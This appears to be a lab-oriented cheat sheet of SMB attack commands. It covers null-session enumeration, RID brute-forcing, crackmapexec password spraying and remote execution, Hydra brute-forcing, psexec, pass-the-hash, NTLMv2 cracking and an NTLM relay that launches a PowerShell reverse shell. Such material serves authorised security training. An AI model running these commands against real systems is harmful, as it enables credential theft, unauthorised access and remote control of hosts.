1. Nmap: `sudo nmap 10.129.14.128 -sV -sC -p139,445`
2. SMBclient
    ```bash
    smbclient -N -L //10.129.14.128 # no logon
    smbclient //10.129.14.128/notes # connecting to share
    ```
3. Download Files: `get file_name`
4. Brute Forcing User RIDs: 
    1. 
        ```bash
        for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
        ```
    2. You can use script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py) alternatively: `samrdump.py 10.129.14.128`
5. Crackmapexec: 
    1. `crackmapexec smb 10.129.14.128 --shares -u '' -p ''`
    2. `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`
    3. `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
    4. `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
    5. `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
5. RPCclient:
```bash
rpcclient -U "" 10.129.14.128
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
enumdomusers
queryuser 0x3e9
querygroup 0x201
```
7. SMBMap:
    1. `smbmap -H 10.129.14.128`
    2. `smbmap -H 10.129.14.128 -r notes`
    3. `smbmap -H 10.129.14.128 --download "notes\note.txt"`
8. Enum4Linux:
```bash
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
./enum4linux-ng.py 10.129.14.128 -A
```
9. HYDRA `hydra -L user.list -P password.list smb://10.129.42.197`
10. `impacket-psexec administrator:'Password123!'@10.10.110.17`
#### **Pass-the-Hash (PtH)**
1. `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
#### **Hashcat for NTLMv2**
1. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
### **impacket-ntlmrelayx**
1. Set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): `cat /etc/responder/Responder.conf | grep 'SMB ='`
2. Execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
3. Create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JAB(..))'`